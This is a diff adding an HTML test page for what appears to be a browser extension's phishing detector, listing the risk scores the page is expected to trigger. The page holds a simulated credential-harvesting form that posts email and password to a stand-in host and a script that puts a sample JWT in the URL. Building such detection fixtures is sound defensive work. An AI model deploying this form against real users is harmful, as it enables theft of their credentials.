@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Test: JWT in URL Detection</title>
+  <style>
+    body { font-family: sans-serif; max-width: 600px; margin: 40px auto; }
+    .info { background: #e8f5e9; padding: 16px; border-radius: 8px; margin-bottom: 20px; }
+    code { background: #eee; padding: 2px 6px; border-radius: 4px; word-break: break-all; }
+    form { background: #f5f5f5; padding: 20px; border-radius: 8px; margin-top: 20px; }
+    input { display: block; margin: 10px 0; padding: 8px; width: 100%; box-sizing: border-box; }
+  </style>
+</head>
+<body>
+  <h1>JWT in URL Detection Test</h1>
+  <div class="info">
+    <strong>Expected:</strong> Extension (Pro tier) should detect JWT_URL (+35),
+    PASSWORD_FIELD (+20), and DOMAIN_MISMATCH (+30) = total 85. ALERT triggered.
+    Load with <code>?token=eyJhbG...&lt;JWT&gt;</code> to also trigger QUERY_TOKEN_PATTERN (+20).
+  </div>
+
+  <p>This page simulates a phishing page that leaks JWTs in the URL while also harvesting credentials.</p>
+
+  <!-- Phishing form submitting to external domain -->
+  <form action="https://phish-jwt.example.com/harvest" method="POST">
+    <label>Email</label>
+    <input type="email" name="email" placeholder="you@example.com">
+    <label>Password</label>
+    <input type="password" name="password" placeholder="Enter password">
+    <button type="submit">Verify Identity</button>
+  </form>
+
+  <script>
+    // Auto-load with JWT in URL if not already present
+    if (!window.location.search.includes("token=")) {
+      const jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";
+      window.location.replace(window.location.pathname + "?token=" + jwt);
+    }
+  </script>
+</body>
+</html>
